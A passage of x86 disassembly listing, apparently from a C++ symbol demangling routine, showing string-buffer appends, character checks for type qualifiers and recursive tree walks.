  401e69:	56                   	push   %esi
  401e6a:	89 c6                	mov    %eax,%esi
  401e6c:	53                   	push   %ebx
  401e6d:	89 d3                	mov    %edx,%ebx
  401e6f:	8b 43 08             	mov    0x8(%ebx),%eax
  401e72:	83 f8 01             	cmp    $0x1,%eax
  401e75:	7f 5e                	jg     0x401ed5
  401e77:	8b 96 1c 01 00 00    	mov    0x11c(%esi),%edx
  401e7d:	81 fa 00 04 00 00    	cmp    $0x400,%edx
  401e83:	7f 50                	jg     0x401ed5
  401e85:	83 c0 01             	add    $0x1,%eax
  401e88:	89 43 08             	mov    %eax,0x8(%ebx)
  401e8b:	8b 03                	mov    (%ebx),%eax
  401e8d:	83 f8 42             	cmp    $0x42,%eax
  401e90:	77 4e                	ja     0x401ee0
  401e92:	83 f8 23             	cmp    $0x23,%eax
  401e95:	77 19                	ja     0x401eb0
  401e97:	8d 48 ff             	lea    -0x1(%eax),%ecx
  401e9a:	83 f9 22             	cmp    $0x22,%ecx
  401e9d:	77 36                	ja     0x401ed5
  401e9f:	ff 24 85 58 f5 42 00 	jmp    *0x42f558(,%eax,4)
  401ea6:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401ead:	8d 76 00             	lea    0x0(%esi),%esi
  401eb0:	8d 48 dc             	lea    -0x24(%eax),%ecx
  401eb3:	bf 01 00 00 00       	mov    $0x1,%edi
  401eb8:	d3 e7                	shl    %cl,%edi
  401eba:	89 f9                	mov    %edi,%ecx
  401ebc:	f7 c7 ec 7d fe 7f    	test   $0x7ffe7dec,%edi
  401ec2:	75 53                	jne    0x401f17
  401ec4:	83 e1 03             	and    $0x3,%ecx
  401ec7:	75 7f                	jne    0x401f48
  401ec9:	83 f8 34             	cmp    $0x34,%eax
  401ecc:	75 07                	jne    0x401ed5
  401ece:	8b 5b 10             	mov    0x10(%ebx),%ebx
  401ed1:	85 db                	test   %ebx,%ebx
  401ed3:	75 9a                	jne    0x401e6f
  401ed5:	5b                   	pop    %ebx
  401ed6:	5e                   	pop    %esi
  401ed7:	5f                   	pop    %edi
  401ed8:	c3                   	ret
  401ed9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401ee0:	8d 48 bb             	lea    -0x45(%eax),%ecx
  401ee3:	83 f9 19             	cmp    $0x19,%ecx
  401ee6:	77 ed                	ja     0x401ed5
  401ee8:	b8 01 00 00 00       	mov    $0x1,%eax
  401eed:	d3 e0                	shl    %cl,%eax
  401eef:	a9 c1 6f 00 02       	test   $0x2006fc1,%eax
  401ef4:	75 21                	jne    0x401f17
  401ef6:	a9 06 10 04 00       	test   $0x41006,%eax
  401efb:	75 04                	jne    0x401f01
  401efd:	a8 18                	test   $0x18,%al
  401eff:	74 d4                	je     0x401ed5
  401f01:	8b 5b 0c             	mov    0xc(%ebx),%ebx
  401f04:	eb cb                	jmp    0x401ed1
  401f06:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401f0d:	8d 76 00             	lea    0x0(%esi),%esi
  401f10:	83 86 44 01 00 00 01 	addl   $0x1,0x144(%esi)
  401f17:	8b 43 0c             	mov    0xc(%ebx),%eax
  401f1a:	83 c2 01             	add    $0x1,%edx
  401f1d:	89 96 1c 01 00 00    	mov    %edx,0x11c(%esi)
  401f23:	89 c2                	mov    %eax,%edx
  401f25:	89 f0                	mov    %esi,%eax
  401f27:	e8 34 ff ff ff       	call   0x401e60
  401f2c:	8b 53 10             	mov    0x10(%ebx),%edx
  401f2f:	89 f0                	mov    %esi,%eax
  401f31:	e8 2a ff ff ff       	call   0x401e60
  401f36:	83 ae 1c 01 00 00 01 	subl   $0x1,0x11c(%esi)
  401f3d:	5b                   	pop    %ebx
  401f3e:	5e                   	pop    %esi
  401f3f:	5f                   	pop    %edi
  401f40:	c3                   	ret
  401f41:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401f48:	8b 43 0c             	mov    0xc(%ebx),%eax
  401f4b:	83 38 05             	cmpl   $0x5,(%eax)
  401f4e:	75 ca                	jne    0x401f1a
  401f50:	83 86 38 01 00 00 01 	addl   $0x1,0x138(%esi)
  401f57:	eb c1                	jmp    0x401f1a
  401f59:	c3                   	ret
  401f5a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  401f60:	31 d2                	xor    %edx,%edx
  401f62:	85 c0                	test   %eax,%eax
  401f64:	75 1b                	jne    0x401f81
  401f66:	eb 1e                	jmp    0x401f86
  401f68:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401f6f:	90                   	nop
  401f70:	8b 48 0c             	mov    0xc(%eax),%ecx
  401f73:	85 c9                	test   %ecx,%ecx
  401f75:	74 0f                	je     0x401f86
  401f77:	8b 40 10             	mov    0x10(%eax),%eax
  401f7a:	83 c2 01             	add    $0x1,%edx
  401f7d:	85 c0                	test   %eax,%eax
  401f7f:	74 05                	je     0x401f86
  401f81:	83 38 30             	cmpl   $0x30,(%eax)
  401f84:	74 ea                	je     0x401f70
  401f86:	89 d0                	mov    %edx,%eax
  401f88:	c3                   	ret
  401f89:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401f90:	85 c0                	test   %eax,%eax
  401f92:	75 1a                	jne    0x401fae
  401f94:	eb 1d                	jmp    0x401fb3
  401f96:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401f9d:	8d 76 00             	lea    0x0(%esi),%esi
  401fa0:	85 d2                	test   %edx,%edx
  401fa2:	74 1c                	je     0x401fc0
  401fa4:	8b 40 10             	mov    0x10(%eax),%eax
  401fa7:	83 ea 01             	sub    $0x1,%edx
  401faa:	85 c0                	test   %eax,%eax
  401fac:	74 1a                	je     0x401fc8
  401fae:	83 38 30             	cmpl   $0x30,(%eax)
  401fb1:	74 ed                	je     0x401fa0
  401fb3:	31 c0                	xor    %eax,%eax
  401fb5:	c3                   	ret
  401fb6:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401fbd:	8d 76 00             	lea    0x0(%esi),%esi
  401fc0:	8b 40 0c             	mov    0xc(%eax),%eax
  401fc3:	c3                   	ret
  401fc4:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401fc8:	c3                   	ret
  401fc9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401fd0:	57                   	push   %edi
  401fd1:	56                   	push   %esi
  401fd2:	53                   	push   %ebx
  401fd3:	83 ec 10             	sub    $0x10,%esp
  401fd6:	8b 74 24 28          	mov    0x28(%esp),%esi
  401fda:	8b 7c 24 24          	mov    0x24(%esp),%edi
  401fde:	8b 46 04             	mov    0x4(%esi),%eax
  401fe1:	8b 5e 08             	mov    0x8(%esi),%ebx
  401fe4:	8d 44 07 01          	lea    0x1(%edi,%eax,1),%eax
  401fe8:	39 c3                	cmp    %eax,%ebx
  401fea:	72 34                	jb     0x402020
  401fec:	8b 46 0c             	mov    0xc(%esi),%eax
  401fef:	85 c0                	test   %eax,%eax
  401ff1:	75 26                	jne    0x402019
  401ff3:	8b 54 24 20          	mov    0x20(%esp),%edx
  401ff7:	8b 46 04             	mov    0x4(%esi),%eax
  401ffa:	03 06                	add    (%esi),%eax
  401ffc:	89 7c 24 08          	mov    %edi,0x8(%esp)
  402000:	89 54 24 04          	mov    %edx,0x4(%esp)
  402004:	89 04 24             	mov    %eax,(%esp)
  402007:	e8 2c 65 01 00       	call   0x418538
  40200c:	8b 06                	mov    (%esi),%eax
  40200e:	01 f8                	add    %edi,%eax
  402010:	03 46 04             	add    0x4(%esi),%eax
  402013:	c6 00 00             	movb   $0x0,(%eax)
  402016:	01 7e 04             	add    %edi,0x4(%esi)
  402019:	83 c4 10             	add    $0x10,%esp
  40201c:	5b                   	pop    %ebx
  40201d:	5e                   	pop    %esi
  40201e:	5f                   	pop    %edi
  40201f:	c3                   	ret
  402020:	8b 4e 0c             	mov    0xc(%esi),%ecx
  402023:	85 c9                	test   %ecx,%ecx
  402025:	75 f2                	jne    0x402019
  402027:	85 db                	test   %ebx,%ebx
  402029:	74 25                	je     0x402050
  40202b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40202f:	90                   	nop
  402030:	01 db                	add    %ebx,%ebx
  402032:	39 c3                	cmp    %eax,%ebx
  402034:	72 fa                	jb     0x402030
  402036:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  40203a:	8b 06                	mov    (%esi),%eax
  40203c:	89 04 24             	mov    %eax,(%esp)
  40203f:	e8 0c 65 01 00       	call   0x418550
  402044:	85 c0                	test   %eax,%eax
  402046:	74 14                	je     0x40205c
  402048:	89 06                	mov    %eax,(%esi)
  40204a:	89 5e 08             	mov    %ebx,0x8(%esi)
  40204d:	eb 9d                	jmp    0x401fec
  40204f:	90                   	nop
  402050:	bb 02 00 00 00       	mov    $0x2,%ebx
  402055:	83 f8 02             	cmp    $0x2,%eax
  402058:	77 d6                	ja     0x402030
  40205a:	eb da                	jmp    0x402036
  40205c:	8b 06                	mov    (%esi),%eax
  40205e:	89 04 24             	mov    %eax,(%esp)
  402061:	e8 9a 64 01 00       	call   0x418500
  402066:	31 d2                	xor    %edx,%edx
  402068:	c7 46 0c 01 00 00 00 	movl   $0x1,0xc(%esi)
  40206f:	89 16                	mov    %edx,(%esi)
  402071:	89 56 04             	mov    %edx,0x4(%esi)
  402074:	89 56 08             	mov    %edx,0x8(%esi)
  402077:	eb a0                	jmp    0x402019
  402079:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402080:	83 ec 1c             	sub    $0x1c,%esp
  402083:	8d 44 24 28          	lea    0x28(%esp),%eax
  402087:	c7 44 24 04 e8 f5 42 	movl   $0x42f5e8,0x4(%esp)
  40208e:	00 
  40208f:	89 44 24 08          	mov    %eax,0x8(%esp)
  402093:	8b 44 24 20          	mov    0x20(%esp),%eax
  402097:	89 04 24             	mov    %eax,(%esp)
  40209a:	e8 c1 0a 01 00       	call   0x412b60
  40209f:	83 c4 1c             	add    $0x1c,%esp
  4020a2:	c3                   	ret
  4020a3:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4020aa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4020b0:	53                   	push   %ebx
  4020b1:	0f b6 10             	movzbl (%eax),%edx
  4020b4:	80 fa 72             	cmp    $0x72,%dl
  4020b7:	0f 94 c1             	sete   %cl
  4020ba:	80 fa 56             	cmp    $0x56,%dl
  4020bd:	0f 94 c3             	sete   %bl
  4020c0:	08 d9                	or     %bl,%cl
  4020c2:	75 14                	jne    0x4020d8
  4020c4:	80 fa 4b             	cmp    $0x4b,%dl
  4020c7:	74 0f                	je     0x4020d8
  4020c9:	31 c9                	xor    %ecx,%ecx
  4020cb:	80 fa 44             	cmp    $0x44,%dl
  4020ce:	74 18                	je     0x4020e8
  4020d0:	89 c8                	mov    %ecx,%eax
  4020d2:	5b                   	pop    %ebx
  4020d3:	c3                   	ret
  4020d4:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4020d8:	b9 01 00 00 00       	mov    $0x1,%ecx
  4020dd:	5b                   	pop    %ebx
  4020de:	89 c8                	mov    %ecx,%eax
  4020e0:	c3                   	ret
  4020e1:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4020e8:	0f b6 40 01          	movzbl 0x1(%eax),%eax
  4020ec:	5b                   	pop    %ebx
  4020ed:	8d 50 89             	lea    -0x77(%eax),%edx
  4020f0:	80 fa 01             	cmp    $0x1,%dl
  4020f3:	0f 96 c1             	setbe  %cl
  4020f6:	83 e0 df             	and    $0xffffffdf,%eax
  4020f9:	3c 4f                	cmp    $0x4f,%al
  4020fb:	0f 94 c0             	sete   %al
  4020fe:	09 c1                	or     %eax,%ecx
  402100:	0f b6 c9             	movzbl %cl,%ecx
  402103:	89 c8                	mov    %ecx,%eax
  402105:	c3                   	ret
  402106:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40210d:	8d 76 00             	lea    0x0(%esi),%esi
  402110:	53                   	push   %ebx
  402111:	89 c3                	mov    %eax,%ebx
  402113:	83 ec 28             	sub    $0x28,%esp
  402116:	8b 80 00 01 00 00    	mov    0x100(%eax),%eax
  40211c:	3d ff 00 00 00       	cmp    $0xff,%eax
  402121:	74 1d                	je     0x402140
  402123:	8d 48 01             	lea    0x1(%eax),%ecx
  402126:	89 8b 00 01 00 00    	mov    %ecx,0x100(%ebx)
  40212c:	88 14 03             	mov    %dl,(%ebx,%eax,1)
  40212f:	88 93 04 01 00 00    	mov    %dl,0x104(%ebx)
  402135:	83 c4 28             	add    $0x28,%esp
  402138:	5b                   	pop    %ebx
  402139:	c3                   	ret
  40213a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402140:	8b 83 0c 01 00 00    	mov    0x10c(%ebx),%eax
  402146:	c6 83 ff 00 00 00 00 	movb   $0x0,0xff(%ebx)
  40214d:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  402151:	89 44 24 08          	mov    %eax,0x8(%esp)
  402155:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  40215c:	00 
  40215d:	89 1c 24             	mov    %ebx,(%esp)
  402160:	ff 93 08 01 00 00    	call   *0x108(%ebx)
  402166:	83 83 28 01 00 00 01 	addl   $0x1,0x128(%ebx)
  40216d:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402171:	31 c0                	xor    %eax,%eax
  402173:	b9 01 00 00 00       	mov    $0x1,%ecx
  402178:	eb ac                	jmp    0x402126
  40217a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402180:	8b 88 10 01 00 00    	mov    0x110(%eax),%ecx
  402186:	85 c9                	test   %ecx,%ecx
  402188:	74 3e                	je     0x4021c8
  40218a:	8b 41 04             	mov    0x4(%ecx),%eax
  40218d:	8b 52 0c             	mov    0xc(%edx),%edx
  402190:	8b 40 10             	mov    0x10(%eax),%eax
  402193:	85 d2                	test   %edx,%edx
  402195:	78 2c                	js     0x4021c3
  402197:	85 c0                	test   %eax,%eax
  402199:	75 13                	jne    0x4021ae
  40219b:	eb 16                	jmp    0x4021b3
  40219d:	8d 76 00             	lea    0x0(%esi),%esi
  4021a0:	85 d2                	test   %edx,%edx
  4021a2:	74 1c                	je     0x4021c0
  4021a4:	8b 40 10             	mov    0x10(%eax),%eax
  4021a7:	83 ea 01             	sub    $0x1,%edx
  4021aa:	85 c0                	test   %eax,%eax
  4021ac:	74 05                	je     0x4021b3
  4021ae:	83 38 30             	cmpl   $0x30,(%eax)
  4021b1:	74 ed                	je     0x4021a0
  4021b3:	31 c0                	xor    %eax,%eax
  4021b5:	c3                   	ret
  4021b6:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4021bd:	8d 76 00             	lea    0x0(%esi),%esi
  4021c0:	8b 40 0c             	mov    0xc(%eax),%eax
  4021c3:	c3                   	ret
  4021c4:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4021c8:	c7 80 18 01 00 00 01 	movl   $0x1,0x118(%eax)
  4021cf:	00 00 00 
  4021d2:	eb df                	jmp    0x4021b3
  4021d4:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4021db:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4021df:	90                   	nop
  4021e0:	57                   	push   %edi
  4021e1:	56                   	push   %esi
  4021e2:	89 c6                	mov    %eax,%esi
  4021e4:	53                   	push   %ebx
  4021e5:	89 d3                	mov    %edx,%ebx
  4021e7:	83 ec 20             	sub    $0x20,%esp
  4021ea:	89 14 24             	mov    %edx,(%esp)
  4021ed:	e8 86 63 01 00       	call   0x418578
  4021f2:	85 c0                	test   %eax,%eax
  4021f4:	0f 84 c6 00 00 00    	je     0x4022c0
  4021fa:	8b 8e 00 01 00 00    	mov    0x100(%esi),%ecx
  402200:	8d 3c 03             	lea    (%ebx,%eax,1),%edi
  402203:	eb 56                	jmp    0x40225b
  402205:	eb 39                	jmp    0x402240
  402207:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40220e:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402215:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40221c:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402223:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40222a:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402231:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402238:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40223f:	90                   	nop
  402240:	89 c8                	mov    %ecx,%eax
  402242:	8d 48 01             	lea    0x1(%eax),%ecx
  402245:	83 c3 01             	add    $0x1,%ebx
  402248:	89 8e 00 01 00 00    	mov    %ecx,0x100(%esi)
  40224e:	88 14 06             	mov    %dl,(%esi,%eax,1)
  402251:	88 96 04 01 00 00    	mov    %dl,0x104(%esi)
  402257:	39 fb                	cmp    %edi,%ebx
  402259:	74 65                	je     0x4022c0
  40225b:	0f b6 13             	movzbl (%ebx),%edx
  40225e:	81 f9 ff 00 00 00    	cmp    $0xff,%ecx
  402264:	75 da                	jne    0x402240
  402266:	8b 86 0c 01 00 00    	mov    0x10c(%esi),%eax
  40226c:	c6 86 ff 00 00 00 00 	movb   $0x0,0xff(%esi)
  402273:	83 c3 01             	add    $0x1,%ebx
  402276:	88 54 24 1f          	mov    %dl,0x1f(%esp)
  40227a:	89 44 24 08          	mov    %eax,0x8(%esp)
  40227e:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  402285:	00 
  402286:	89 34 24             	mov    %esi,(%esp)
  402289:	ff 96 08 01 00 00    	call   *0x108(%esi)
  40228f:	0f b6 54 24 1f       	movzbl 0x1f(%esp),%edx
  402294:	83 86 28 01 00 00 01 	addl   $0x1,0x128(%esi)
  40229b:	c7 86 00 01 00 00 01 	movl   $0x1,0x100(%esi)
  4022a2:	00 00 00 
  4022a5:	88 16                	mov    %dl,(%esi)
  4022a7:	88 96 04 01 00 00    	mov    %dl,0x104(%esi)
  4022ad:	39 df                	cmp    %ebx,%edi
  4022af:	74 0f                	je     0x4022c0
  4022b1:	0f b6 13             	movzbl (%ebx),%edx
  4022b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4022b9:	eb 87                	jmp    0x402242
  4022bb:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4022bf:	90                   	nop
  4022c0:	83 c4 20             	add    $0x20,%esp
  4022c3:	5b                   	pop    %ebx
  4022c4:	5e                   	pop    %esi
  4022c5:	5f                   	pop    %edi
  4022c6:	c3                   	ret
  4022c7:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4022ce:	66 90                	xchg   %ax,%ax
  4022d0:	85 d2                	test   %edx,%edx
  4022d2:	0f 84 c8 00 00 00    	je     0x4023a0
  4022d8:	56                   	push   %esi
  4022d9:	89 c6                	mov    %eax,%esi
  4022db:	53                   	push   %ebx
  4022dc:	89 d3                	mov    %edx,%ebx
  4022de:	83 ec 04             	sub    $0x4,%esp
  4022e1:	8b 03                	mov    (%ebx),%eax
  4022e3:	83 f8 34             	cmp    $0x34,%eax
  4022e6:	77 08                	ja     0x4022f0
  4022e8:	ff 24 85 ec f5 42 00 	jmp    *0x42f5ec(,%eax,4)
  4022ef:	90                   	nop
  4022f0:	83 e8 43             	sub    $0x43,%eax
  4022f3:	83 f8 1c             	cmp    $0x1c,%eax
  4022f6:	77 18                	ja     0x402310
  4022f8:	ba e3 0c 00 10       	mov    $0x10000ce3,%edx
  4022fd:	0f a3 c2             	bt     %eax,%edx
  402300:	72 2e                	jb     0x402330
  402302:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402309:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  402310:	8b 53 0c             	mov    0xc(%ebx),%edx
  402313:	89 f0                	mov    %esi,%eax
  402315:	e8 b6 ff ff ff       	call   0x4022d0
  40231a:	85 c0                	test   %eax,%eax
  40231c:	75 14                	jne    0x402332
  40231e:	8b 5b 10             	mov    0x10(%ebx),%ebx
  402321:	85 db                	test   %ebx,%ebx
  402323:	75 bc                	jne    0x4022e1
  402325:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40232c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  402330:	31 c0                	xor    %eax,%eax
  402332:	83 c4 04             	add    $0x4,%esp
  402335:	5b                   	pop    %ebx
  402336:	5e                   	pop    %esi
  402337:	c3                   	ret
  402338:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40233f:	90                   	nop
  402340:	8b 86 10 01 00 00    	mov    0x110(%esi),%eax
  402346:	85 c0                	test   %eax,%eax
  402348:	74 46                	je     0x402390
  40234a:	8b 40 04             	mov    0x4(%eax),%eax
  40234d:	8b 53 0c             	mov    0xc(%ebx),%edx
  402350:	8b 40 10             	mov    0x10(%eax),%eax
  402353:	85 d2                	test   %edx,%edx
  402355:	78 24                	js     0x40237b
  402357:	85 c0                	test   %eax,%eax
  402359:	75 13                	jne    0x40236e
  40235b:	eb d3                	jmp    0x402330
  40235d:	8d 76 00             	lea    0x0(%esi),%esi
  402360:	85 d2                	test   %edx,%edx
  402362:	74 14                	je     0x402378
  402364:	8b 40 10             	mov    0x10(%eax),%eax
  402367:	83 ea 01             	sub    $0x1,%edx
  40236a:	85 c0                	test   %eax,%eax
  40236c:	74 c2                	je     0x402330
  40236e:	83 38 30             	cmpl   $0x30,(%eax)
  402371:	74 ed                	je     0x402360
  402373:	eb bb                	jmp    0x402330
  402375:	8d 76 00             	lea    0x0(%esi),%esi
  402378:	8b 40 0c             	mov    0xc(%eax),%eax
  40237b:	85 c0                	test   %eax,%eax
  40237d:	74 b1                	je     0x402330
  40237f:	83 38 30             	cmpl   $0x30,(%eax)
  402382:	75 ac                	jne    0x402330
  402384:	83 c4 04             	add    $0x4,%esp
  402387:	5b                   	pop    %ebx
  402388:	5e                   	pop    %esi
  402389:	c3                   	ret
  40238a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  402390:	c7 86 18 01 00 00 01 	movl   $0x1,0x118(%esi)
  402397:	00 00 00 
  40239a:	eb 94                	jmp    0x402330
  40239c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4023a0:	31 c0                	xor    %eax,%eax
  4023a2:	c3                   	ret
  4023a3:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4023aa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  4023b0:	8b 50 0c             	mov    0xc(%eax),%edx
  4023b3:	80 3a 54             	cmpb   $0x54,(%edx)
  4023b6:	75 70                	jne    0x402428
  4023b8:	56                   	push   %esi
  4023b9:	53                   	push   %ebx
  4023ba:	89 c3                	mov    %eax,%ebx
  4023bc:	8d 42 01             	lea    0x1(%edx),%eax
  4023bf:	89 43 0c             	mov    %eax,0xc(%ebx)
  4023c2:	0f b6 52 01          	movzbl 0x1(%edx),%edx
  4023c6:	80 fa 5f             	cmp    $0x5f,%dl
  4023c9:	74 65                	je     0x402430
  4023cb:	80 fa 6e             	cmp    $0x6e,%dl
  4023ce:	74 50                	je     0x402420
  4023d0:	89 d8                	mov    %ebx,%eax
  4023d2:	e8 59 f8 ff ff       	call   0x401c30
  4023d7:	83 c0 01             	add    $0x1,%eax
  4023da:	89 c1                	mov    %eax,%ecx
  4023dc:	78 42                	js     0x402420
  4023de:	8b 43 0c             	mov    0xc(%ebx),%eax
  4023e1:	80 38 5f             	cmpb   $0x5f,(%eax)
  4023e4:	75 3a                	jne    0x402420
  4023e6:	83 c0 01             	add    $0x1,%eax
  4023e9:	8b 53 14             	mov    0x14(%ebx),%edx
  4023ec:	89 43 0c             	mov    %eax,0xc(%ebx)
  4023ef:	3b 53 18             	cmp    0x18(%ebx),%edx
  4023f2:	7d 2c                	jge    0x402420
  4023f4:	8b 43 10             	mov    0x10(%ebx),%eax
  4023f7:	8d 34 92             	lea    (%edx,%edx,4),%esi
  4023fa:	83 c2 01             	add    $0x1,%edx
  4023fd:	8d 04 b0             	lea    (%eax,%esi,4),%eax
  402400:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  402407:	c7 40 08 00 00 00 00 	movl   $0x0,0x8(%eax)
  40240e:	89 53 14             	mov    %edx,0x14(%ebx)
  402411:	c7 00 05 00 00 00    	movl   $0x5,(%eax)
  402417:	89 48 0c             	mov    %ecx,0xc(%eax)
  40241a:	5b                   	pop    %ebx
  40241b:	5e                   	pop    %esi
  40241c:	c3                   	ret
  40241d:	8d 76 00             	lea    0x0(%esi),%esi
  402420:	31 c0                	xor    %eax,%eax
  402422:	5b                   	pop    %ebx
  402423:	5e                   	pop    %esi
  402424:	c3                   	ret
  402425:	8d 76 00             	lea    0x0(%esi),%esi
  402428:	31 c0                	xor    %eax,%eax
  40242a:	c3                   	ret
  40242b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40242f:	90                   	nop
  402430:	31 c9                	xor    %ecx,%ecx
  402432:	eb b2                	jmp    0x4023e6
  402434:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40243b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40243f:	90                   	nop
  402440:	57                   	push   %edi
  402441:	56                   	push   %esi
  402442:	89 c6                	mov    %eax,%esi
  402444:	53                   	push   %ebx
  402445:	83 ec 40             	sub    $0x40,%esp
  402448:	8d 5c 24 27          	lea    0x27(%esp),%ebx
  40244c:	89 54 24 08          	mov    %edx,0x8(%esp)
  402450:	c7 44 24 04 e8 f5 42 	movl   $0x42f5e8,0x4(%esp)
  402457:	00 
  402458:	89 1c 24             	mov    %ebx,(%esp)
  40245b:	e8 20 fc ff ff       	call   0x402080
  402460:	89 1c 24             	mov    %ebx,(%esp)
  402463:	e8 10 61 01 00       	call   0x418578
  402468:	85 c0                	test   %eax,%eax
  40246a:	0f 84 90 00 00 00    	je     0x402500
  402470:	8b 96 00 01 00 00    	mov    0x100(%esi),%edx
  402476:	8d 3c 03             	lea    (%ebx,%eax,1),%edi
  402479:	eb 20                	jmp    0x40249b
  40247b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  40247f:	90                   	nop
  402480:	89 d0                	mov    %edx,%eax
  402482:	8d 50 01             	lea    0x1(%eax),%edx
  402485:	83 c3 01             	add    $0x1,%ebx
  402488:	89 96 00 01 00 00    	mov    %edx,0x100(%esi)
  40248e:	88 0c 06             	mov    %cl,(%esi,%eax,1)
  402491:	88 8e 04 01 00 00    	mov    %cl,0x104(%esi)
  402497:	39 fb                	cmp    %edi,%ebx
  402499:	74 65                	je     0x402500
  40249b:	0f b6 0b             	movzbl (%ebx),%ecx
  40249e:	81 fa ff 00 00 00    	cmp    $0xff,%edx
  4024a4:	75 da                	jne    0x402480
  4024a6:	8b 86 0c 01 00 00    	mov    0x10c(%esi),%eax
  4024ac:	c6 86 ff 00 00 00 00 	movb   $0x0,0xff(%esi)
  4024b3:	83 c3 01             	add    $0x1,%ebx
  4024b6:	88 4c 24 1f          	mov    %cl,0x1f(%esp)
  4024ba:	89 44 24 08          	mov    %eax,0x8(%esp)
  4024be:	c7 44 24 04 ff 00 00 	movl   $0xff,0x4(%esp)
  4024c5:	00 
  4024c6:	89 34 24             	mov    %esi,(%esp)
  4024c9:	ff 96 08 01 00 00    	call   *0x108(%esi)
  4024cf:	0f b6 4c 24 1f       	movzbl 0x1f(%esp),%ecx
  4024d4:	83 86 28 01 00 00 01 	addl   $0x1,0x128(%esi)
  4024db:	c7 86 00 01 00 00 01 	movl   $0x1,0x100(%esi)
  4024e2:	00 00 00 
  4024e5:	88 0e                	mov    %cl,(%esi)
  4024e7:	88 8e 04 01 00 00    	mov    %cl,0x104(%esi)
  4024ed:	39 df                	cmp    %ebx,%edi
  4024ef:	74 0f                	je     0x402500
  4024f1:	0f b6 0b             	movzbl (%ebx),%ecx
  4024f4:	b8 01 00 00 00       	mov    $0x1,%eax
  4024f9:	eb 87                	jmp    0x402482
  4024fb:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  4024ff:	90                   	nop
  402500:	83 c4 40             	add    $0x40,%esp
  402503:	5b                   	pop    %ebx
  402504:	5e                   	pop    %esi
  402505:	5f                   	pop    %edi
  402506:	c3                   	ret
  402507:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  40250e:	66 90                	xchg   %ax,%ax
  402510:	55                   	push   %ebp
  402511:	57                   	push   %edi
  402512:	56                   	push   %esi
  402513:	53                   	push   %ebx
  402514:	89 c3                	mov    %eax,%ebx
  402516:	83 ec 04             	sub    $0x4,%esp
  402519:	e8 12 f7 ff ff       	call   0x401c30
  40251e:	85 c0                	test   %eax,%eax
  402520:	7e 4e                	jle    0x402570
  402522:	8b 6b 0c             	mov    0xc(%ebx),%ebp
  402525:	89 c1                	mov    %eax,%ecx
  402527:	8b 43 04             	mov    0x4(%ebx),%eax
  40252a:	29 e8                	sub    %ebp,%eax
  40252c:	39 c1                	cmp    %eax,%ecx
  40252e:	0f 8f e4 00 00 00    	jg     0x402618
  402534:	8d 44 0d 00          	lea    0x0(%ebp,%ecx,1),%eax
  402538:	89 43 0c             	mov    %eax,0xc(%ebx)
  40253b:	f6 43 08 04          	testb  $0x4,0x8(%ebx)
  40253f:	74 09                	je     0x40254a
